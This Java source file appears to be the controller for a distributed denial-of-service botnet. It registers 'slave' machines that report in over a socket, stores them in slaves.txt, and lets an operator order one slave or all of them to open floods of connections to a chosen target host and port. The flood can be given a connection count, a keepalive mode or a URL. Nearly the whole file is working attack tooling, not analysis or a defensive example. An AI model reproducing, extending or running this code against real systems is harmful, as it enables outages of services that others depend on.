import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketAddress;
import java.net.SocketImpl;
import java.net.UnknownHostException;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;
import java.util.Scanner;
import java.util.regex.Pattern;

public class DDoSMaster {
	
	public static List<SlaveDO> slaves = new ArrayList<SlaveDO>();
	public static File slavesList = new File("./slaves.txt");

	public static void main(String[] args) throws IOException {
		if(args.length == 2) {
			if(args[0].equals("-p") && isValidPort(args[1])) {
				if(!slavesList.exists()) {
					try {
						slavesList.createNewFile();
					} catch (IOException e) {
						e.printStackTrace();
					}
				}
				try {
					loadSlavesFromFile();
				} catch (ParseException e) {
					e.printStackTrace();
				}
				new Thread(new Terminal()).start();
				new Thread(new SlaveListener(Integer.parseInt(args[1]))).start();
			} else {
				System.out.println("Usage:\n\tjava DDoSMaster -p [portNumber]\n\tPlease follow the proper format");
				System.exit(-1);
			}
		} else {
			System.out.println("Usage:\n\tjava DDoSMaster -p [portNumber]\n\tPlease follow the proper format");
			System.exit(-1);
		}
	}

	public static void loadSlavesFromFile() throws IOException, ParseException {
		BufferedReader br = new BufferedReader(new FileReader(slavesList));
		String line;
		while ((line = br.readLine()) != null) {
			String[] slaveDetails = line.split("\t");
			slaves.add(new SlaveDO(slaveDetails[0], slaveDetails[1], new SimpleDateFormat("yyyy-MM-dd").parse(slaveDetails[2])));
		}
	}
	
	public static boolean isValidIP(final String ip) {
		final Pattern PATTERN = Pattern.compile(
		        "^(([01]?\\d\\d?|2[0-4]\\d|25[0-5])\\.){3}([01]?\\d\\d?|2[0-4]\\d|25[0-5])$");
		return PATTERN.matcher(ip).matches();
	}
	
	public static boolean isValidPort(final String port) {
		boolean isValidPort = false;
		final Pattern PATTERN = Pattern.compile("^[0-9]+$");
		if(PATTERN.matcher(port).matches()) {
			if(Integer.parseInt(port) < 65536) {
				isValidPort = true;
			} else {
				isValidPort = false;
			}
		}
		return isValidPort;
	}

	public static boolean isValidHost(String hostName) {
		boolean isValidHost = false;
		try {
			InetAddress.getByName(hostName);
			isValidHost = true;
		} catch (UnknownHostException e) {
			isValidHost = false;
		}
		return isValidHost;
	}
	
	public static boolean isValidIPOrHost(String ipOrHost) {
		return isValidIP(ipOrHost) || isValidHost(ipOrHost);
	}

	public static SlaveDO findSlave(String targetSlave) throws UnknownHostException {
		SlaveDO foundSlave = null;
		for (SlaveDO slave : slaves) {
			if(slave.ipAddress.equals(InetAddress.getByName(targetSlave).getHostAddress())) {
				foundSlave = slave;
			}
		}
		return foundSlave;
	}

	public static boolean isValidCount(String connectionCount) {
		boolean isValidCount = false;
		final Pattern PATTERN = Pattern.compile("^[0-9]+$");
		if(PATTERN.matcher(connectionCount).matches()) {
			isValidCount = true;
		}
		return isValidCount;
	}

	public static boolean isValidSlaveName(String slave) {
		boolean isValidSlaveName = false;
		if(slave.substring(0, 5).toLowerCase().equals("slave") && isValidCount(slave.substring(5))) {
			isValidSlaveName = true;
		} else {
			isValidSlaveName = false;
		}
		return isValidSlaveName;
	}

	public static SlaveDO findSlaveFromName(String string) {
		SlaveDO foundSlave = null;
		int slaveIndex = Integer.parseInt(string.substring(5)) - 1;
		if(slaveIndex >= 0) {
			foundSlave = slaves.get(slaveIndex);
		}
		return foundSlave;
	}

	public static boolean isValidURL(String url) {
		boolean isValidURL = false;
		final Pattern PATTERN = Pattern.compile("^url=/");
		if(PATTERN.matcher(url).find()) {
			isValidURL = true;
		}
		return isValidURL;
	}

}

class Terminal implements Runnable {
	
	@Override
	public void run() {
		System.out.println("Server is up. Please type in the commands!");
		Scanner sc = new Scanner(System.in);
		while(true) {
			System.out.print("> ");
			String command;
			command = sc.nextLine();
			if(!command.trim().equals("")) {
				new Thread(new CommandExecuter(command)).start();
			}
		}
	}
}

class CommandExecuter implements Runnable {
	
	String command;
	
	CommandExecuter(String command) {
		this.command = command;
	}
	
	private void sendCommand(SlaveDO slaveDO, String command) throws NumberFormatException, UnknownHostException, IOException {
		Socket socket = new Socket(slaveDO.ipAddress, Integer.parseInt(slaveDO.port));
		PrintWriter pw = new PrintWriter(socket.getOutputStream(), true);
		pw.println(command);
	}

	@Override
	public void run() {
		String[] commandComponents = command.split(" ");
		switch (commandComponents[0]) {
		case "list":
			if(commandComponents.length == 1) {
				for (int i = 0; i < DDoSMaster.slaves.size(); i++) {
					System.out.println("\t" + (i + 1) + ".\t" + "Slave" + (i + 1) + "\t" + "IP: " + DDoSMaster.slaves.get(i).ipAddress + "\t" + "Port: " + DDoSMaster.slaves.get(i).port + "\t" + "Reg Date: " + new SimpleDateFormat("yyyy-MM-dd").format(DDoSMaster.slaves.get(i).regDate));
					System.out.print("> ");
				}
			} else {
				System.out.println("Usage:\n\tlist\n\tconnect [slave | 'all'] [targetHost] [targetPort] [Optional: No of Connections] [Optional: 'keepalive'] [Optional: URL]\n\tdisconnect [slave | 'all'] [target] [Optional: targetPort]\n\tPlease follow the proper format");
				System.out.print("> ");
			}
			break;
		case "connect":
			try {
				if(commandComponents.length == 4) {
					if(commandComponents[1].equals("all") && DDoSMaster.isValidIPOrHost(commandComponents[2]) && DDoSMaster.isValidPort(commandComponents[3])) {
						for (int i = 0; i < DDoSMaster.slaves.size(); i++) {
							this.sendCommand(DDoSMaster.slaves.get(i), "connect "+ commandComponents[2] + " " + commandComponents[3]);
						}
					} else if(DDoSMaster.isValidIPOrHost(commandComponents[1]) && DDoSMaster.isValidIPOrHost(commandComponents[2]) && DDoSMaster.isValidPort(commandComponents[3])) {
						SlaveDO targetSlave = DDoSMaster.findSlave(commandComponents[1]);
						if(targetSlave != null) {
							this.sendCommand(targetSlave, "connect "+ commandComponents[2] + " " + commandComponents[3]);
						}
					} else if(DDoSMaster.isValidSlaveName(commandComponents[1]) && DDoSMaster.isValidIPOrHost(commandComponents[2]) && DDoSMaster.isValidPort(commandComponents[3])) {
						SlaveDO targetSlave = DDoSMaster.findSlaveFromName(commandComponents[1]);
						if(targetSlave != null) {
							this.sendCommand(targetSlave, "connect "+ commandComponents[2] + " " + commandComponents[3]);
						}
					} else {
						System.out.println("Usage:\n\tlist\n\tconnect [slave | 'all'] [targetHost] [targetPort] [Optional: No of Connections] [Optional: 'keepalive'] [Optional: URL]\n\tdisconnect [slave | 'all'] [target] [Optional: targetPort]\n\tPlease follow the proper format");
						System.out.print("> ");
					}
				} else if(commandComponents.length == 5) {
					if(commandComponents[1].equals("all") && DDoSMaster.isValidIPOrHost(commandComponents[2]) && DDoSMaster.isValidPort(commandComponents[3])) {
						if(DDoSMaster.isValidCount(commandComponents[4]) || commandComponents[4].equals("keepalive") || DDoSMaster.isValidURL(commandComponents[4])) {
							for (int i = 0; i < DDoSMaster.slaves.size(); i++) {
								this.sendCommand(DDoSMaster.slaves.get(i), "connect "+ commandComponents[2] + " " + commandComponents[3] + " " + commandComponents[4]);
							}
						} else {
							System.out.println("Usage:\n\tlist\n\tconnect [slave | 'all'] [targetHost] [targetPort] [Optional: No of Connections] [Optional: 'keepalive'] [Optional: URL]\n\tdisconnect [slave | 'all'] [target] [Optional: targetPort]\n\tPlease follow the proper format");
							System.out.print("> ");
						}
					} else if(DDoSMaster.isValidIPOrHost(commandComponents[1]) && DDoSMaster.isValidIPOrHost(commandComponents[2]) && DDoSMaster.isValidPort(commandComponents[3])) {
						if(DDoSMaster.isValidCount(commandComponents[4]) || commandComponents[4].equals("keepalive") || DDoSMaster.isValidURL(commandComponents[4])) {
							SlaveDO targetSlave = DDoSMaster.findSlave(commandComponents[1]);
							if(targetSlave != null) {
								this.sendCommand(targetSlave, "connect "+ commandComponents[2] + " " + commandComponents[3] + " " + commandComponents[4]);
							}
						} else {
							System.out.println("Usage:\n\tlist\n\tconnect [slave | 'all'] [targetHost] [targetPort] [Optional: No of Connections] [Optional: 'keepalive'] [Optional: URL]\n\tdisconnect [slave | 'all'] [target] [Optional: targetPort]\n\tPlease follow the proper format");
							System.out.print("> ");
						}
					} else if(DDoSMaster.isValidSlaveName(commandComponents[1]) && DDoSMaster.isValidIPOrHost(commandComponents[2]) && DDoSMaster.isValidPort(commandComponents[3])) {
						if(DDoSMaster.isValidCount(commandComponents[4]) || commandComponents[4].equals("keepalive") || DDoSMaster.isValidURL(commandComponents[4])) {
							SlaveDO targetSlave = DDoSMaster.findSlaveFromName(commandComponents[1]);
							if(targetSlave != null) {
								this.sendCommand(targetSlave, "connect "+ commandComponents[2] + " " + commandComponents[3] + " " + commandComponents[4]);
							}
						} else {
							System.out.println("Usage:\n\tlist\n\tconnect [slave | 'all'] [targetHost] [targetPort] [Optional: No of Connections] [Optional: 'keepalive'] [Optional: URL]\n\tdisconnect [slave | 'all'] [target] [Optional: targetPort]\n\tPlease follow the proper format");
							System.out.print("> ");
						}
					} else {
						System.out.println("Usage:\n\tlist\n\tconnect [slave | 'all'] [targetHost] [targetPort] [Optional: No of Connections] [Optional: 'keepalive'] [Optional: URL]\n\tdisconnect [slave | 'all'] [target] [Optional: targetPort]\n\tPlease follow the proper format");
						System.out.print("> ");
					}
				} else if(commandComponents.length == 6) {
					if(commandComponents[1].equals("all") && DDoSMaster.isValidIPOrHost(commandComponents[2]) && DDoSMaster.isValidPort(commandComponents[3]) && DDoSMaster.isValidCount(commandComponents[4])) {
						if(commandComponents[5].equals("keepalive") || DDoSMaster.isValidURL(commandComponents[5])) {
							for (int i = 0; i < DDoSMaster.slaves.size(); i++) {
								this.sendCommand(DDoSMaster.slaves.get(i), "connect "+ commandComponents[2] + " " + commandComponents[3] + " " + commandComponents[4] + " " + commandComponents[5]);
							}
						} else {
							System.out.println("Usage:\n\tlist\n\tconnect [slave | 'all'] [targetHost] [targetPort] [Optional: No of Connections] [Optional: 'keepalive'] [Optional: URL]\n\tdisconnect [slave | 'all'] [target] [Optional: targetPort]\n\tPlease follow the proper format");
							System.out.print("> ");
						}
					} else if(DDoSMaster.isValidIPOrHost(commandComponents[1]) && DDoSMaster.isValidIPOrHost(commandComponents[2]) && DDoSMaster.isValidPort(commandComponents[3]) && DDoSMaster.isValidCount(commandComponents[4])) {
						if(commandComponents[5].equals("keepalive") || DDoSMaster.isValidURL(commandComponents[5])) {
							SlaveDO targetSlave = DDoSMaster.findSlave(commandComponents[1]);
							if(targetSlave != null) {
								this.sendCommand(targetSlave, "connect "+ commandComponents[2] + " " + commandComponents[3] + " " + commandComponents[4] + " " + commandComponents[5]);
							}
						} else {
							System.out.println("Usage:\n\tlist\n\tconnect [slave | 'all'] [targetHost] [targetPort] [Optional: No of Connections] [Optional: 'keepalive'] [Optional: URL]\n\tdisconnect [slave | 'all'] [target] [Optional: targetPort]\n\tPlease follow the proper format");
							System.out.print("> ");
						}
					} else if(DDoSMaster.isValidSlaveName(commandComponents[1]) && DDoSMaster.isValidIPOrHost(commandComponents[2]) && DDoSMaster.isValidPort(commandComponents[3]) && DDoSMaster.isValidCount(commandComponents[4])) {
						if(commandComponents[5].equals("keepalive") || DDoSMaster.isValidURL(commandComponents[5])) {
							SlaveDO targetSlave = DDoSMaster.findSlaveFromName(commandComponents[1]);
							if(targetSlave != null) {
								this.sendCommand(targetSlave, "connect "+ commandComponents[2] + " " + commandComponents[3] + " " + commandComponents[4] + " " + commandComponents[5]);
							}
						} else {
							System.out.println("Usage:\n\tlist\n\tconnect [slave | 'all'] [targetHost] [targetPort] [Optional: No of Connections] [Optional: 'keepalive'] [Optional: URL]\n\tdisconnect [slave | 'all'] [target] [Optional: targetPort]\n\tPlease follow the proper format");
							System.out.print("> ");
						}
					} else {
						System.out.println("Usage:\n\tlist\n\tconnect [slave | 'all'] [targetHost] [targetPort] [Optional: No of Connections] [Optional: 'keepalive'] [Optional: URL]\n\tdisconnect [slave | 'all'] [target] [Optional: targetPort]\n\tPlease follow the proper format");
						System.out.print("> ");
					}
				} else {
					System.out.println("Usage:\n\tlist\n\tconnect [slave | 'all'] [targetHost] [targetPort] [Optional: No of Connections] [Optional: 'keepalive'] [Optional: URL]\n\tdisconnect [slave | 'all'] [target] [Optional: targetPort]\n\tPlease follow the proper format");
					System.out.print("> ");
				}
			} catch (NumberFormatException | IOException e) {
				e.printStackTrace();
			}
			break;
		case "disconnect":
			try {
				if(commandComponents.length == 3) {
					if(commandComponents[1].equals("all") && DDoSMaster.isValidIPOrHost(commandComponents[2])) {
						for (int i = 0; i < DDoSMaster.slaves.size(); i++) {
							this.sendCommand(DDoSMaster.slaves.get(i), "disconnect "+ commandComponents[2]);
						}
					} else if(DDoSMaster.isValidIPOrHost(commandComponents[1]) && DDoSMaster.isValidIPOrHost(commandComponents[2])) {
						SlaveDO targetSlave = DDoSMaster.findSlave(commandComponents[1]);
						if(targetSlave != null) {
							this.sendCommand(targetSlave, "disconnect "+ commandComponents[2]);
						}
					} else if(DDoSMaster.isValidSlaveName(commandComponents[1]) && DDoSMaster.isValidIPOrHost(commandComponents[2])) {
						SlaveDO targetSlave = DDoSMaster.findSlaveFromName(commandComponents[1]);
						if(targetSlave != null) {
							this.sendCommand(targetSlave, "disconnect "+ commandComponents[2]);
						}
					} else {
						System.out.println("Usage:\n\tlist\n\tconnect [slave | 'all'] [targetHost] [targetPort] [Optional: No of Connections]\n\tdisconnect [slave | 'all'] [target] [Optional: targetPort]\n\tPlease follow the proper format");
						System.out.print("> ");
					}
				} else if(commandComponents.length == 4) {
					if(commandComponents[1].equals("all") && DDoSMaster.isValidIPOrHost(commandComponents[2]) && DDoSMaster.isValidPort(commandComponents[3])) {
						for (int i = 0; i < DDoSMaster.slaves.size(); i++) {
							this.sendCommand(DDoSMaster.slaves.get(i), "disconnect "+ commandComponents[2] + " " + commandComponents[3]);
						}
					} else if(DDoSMaster.isValidIPOrHost(commandComponents[1]) && DDoSMaster.isValidIPOrHost(commandComponents[2]) && DDoSMaster.isValidPort(commandComponents[3])) {
						SlaveDO targetSlave = DDoSMaster.findSlave(commandComponents[1]);
						if(targetSlave != null) {
							this.sendCommand(targetSlave, "disconnect "+ commandComponents[2] + " " + commandComponents[3]);
						}
					} else if(DDoSMaster.isValidSlaveName(commandComponents[1]) && DDoSMaster.isValidIPOrHost(commandComponents[2]) && DDoSMaster.isValidPort(commandComponents[3])) {
						SlaveDO targetSlave = DDoSMaster.findSlaveFromName(commandComponents[1]);
						if(targetSlave != null) {
							this.sendCommand(targetSlave, "disconnect "+ commandComponents[2] + " " + commandComponents[3]);
						}
					} else {
						System.out.println("Usage:\n\tlist\n\tconnect [slave | 'all'] [targetHost] [targetPort] [Optional: No of Connections]\n\tdisconnect [slave | 'all'] [target] [Optional: targetPort]\n\tPlease follow the proper format");
						System.out.print("> ");
					}
				} else {
					System.out.println("Usage:\n\tlist\n\tconnect [slave | 'all'] [targetHost] [targetPort] [Optional: No of Connections]\n\tdisconnect [slave | 'all'] [target] [Optional: targetPort]\n\tPlease follow the proper format");
					System.out.print("> ");
				}
			} catch (NumberFormatException | IOException e) {
				e.printStackTrace();
			}
			break;
		default:
			System.out.println("Usage:\n\tlist\n\tconnect [slave | 'all'] [targetHost] [targetPort] [Optional: No of Connections]\n\tdisconnect [slave | 'all'] [target] [Optional: targetPort]\n\tPlease follow the proper format");
			System.out.print("> ");
		}
	}
	
}

class SlaveListener implements Runnable {
	
	int port;
	
	public SlaveListener(int port) {
		this.port = port;
	}
	
	
	@Override
	public void run() {
		try {
			ServerSocket serverSocket = new ServerSocket(port);
			while(true) {
				Socket slaveSocket = serverSocket.accept();
				BufferedReader br = new BufferedReader(new InputStreamReader(slaveSocket.getInputStream()));
				String slaveMessage = br.readLine();
				String[] messageParts = slaveMessage.split(" ");
				if(messageParts.length == 3 && messageParts[0].equals("reg") && DDoSMaster.isValidIP(messageParts[1]) && DDoSMaster.isValidPort(messageParts[2])) {
					BufferedWriter bw = new BufferedWriter(new FileWriter(DDoSMaster.slavesList, true));
					bw.write(messageParts[1] + "\t" + messageParts[2] + "\t" + new SimpleDateFormat("yyyy-MM-dd").format(Calendar.getInstance().getTime()));
					bw.flush();
					bw.close();
					DDoSMaster.slaves.add(new SlaveDO(messageParts[1], messageParts[2], Calendar.getInstance().getTime()));
				}
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
}

class SlaveDO {
	
	String ipAddress;
	String port;
	Date regDate;
	
	public SlaveDO(String ipAddress, String port, Date regDate) {
		this.ipAddress = ipAddress;
		this.port = port;
		this.regDate = regDate;
	}
}